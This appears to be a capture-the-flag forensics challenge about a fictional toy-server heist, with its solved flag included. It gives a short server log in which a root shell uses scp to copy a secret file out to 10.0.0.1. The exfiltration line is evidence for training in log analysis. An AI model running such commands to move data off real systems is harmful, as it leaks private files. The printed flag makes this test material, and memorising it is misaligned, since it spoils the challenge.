```
 Christmas Toys Heist #5
100

To which IP address was the data exfiltrated and what is the full name of the method used for exfiltration?

Flag format: CMCTF{ipaddress_fullmethodname}

Author: t4f3

```


server.log
```
Dec 20 00:02:20 santatoys-server bash[1252]: root@santatoys-server:/root/santa/.secret/toys# scp santa_toy_flag 10.0.0.1:/tmp/
Dec 20 00:02:25 santatoys-server scp[1253]: santa_toy_flag                                   100%   20B  10.0KB/s   00:00`````
# flag: CMCTF{10.0.0.1_securecopyprotocol}
